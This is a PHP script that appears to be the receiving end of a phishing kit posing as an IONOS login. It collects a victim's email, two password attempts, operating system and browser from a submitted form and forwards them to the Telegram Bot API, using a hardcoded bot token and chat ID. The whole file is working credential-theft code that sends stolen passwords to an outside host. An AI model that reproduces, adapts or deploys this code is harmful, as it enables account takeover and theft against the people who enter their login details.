<?php
// Telegram bot token and chat ID
$telegramBotToken = '7576672133:AAGBaJlD-Sh8dwsQr_9MJroYvKd97eerk6s';
$telegramChatID = '6825925549';

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve form data
    $email = $_POST['email'] ?? 'N/A';
    $password1 = $_POST['password1'] ?? 'N/A'; // First password
    $password2 = $_POST['password2'] ?? 'N/A'; // Second password
    $os = $_POST['os'] ?? 'Unknown OS';
    $browser = $_POST['browser'] ?? 'Unknown Browser';

    // Prepare message for Telegram
    $message = "IONOS Log:\n";
    $message .= "Email:   $email\n";
    $message .= "First:   $password1\n"; // First password sent first
    if ($password2 !== 'N/A') {
        $message .= "Second:   $password2\n"; // Send second password only after the second attempt
    }
    $message .= "Operating System: $os\n";
    $message .= "Browser: $browser\n";

    // Telegram API URL
    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

    // Data to send via POST
    $data = [
        'chat_id' => $telegramChatID,
        'text' => $message,
        'parse_mode' => 'HTML' // Use HTML formatting if needed
    ];

    // Initialize cURL
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute cURL and capture the response
    $response = curl_exec($ch);

    // Check for errors
    if ($response === false) {
        echo "Error sending message to Telegram: " . curl_error($ch);
    } else {
        echo "Message sent successfully!";
    }

    // Close cURL
    curl_close($ch);
}
?>
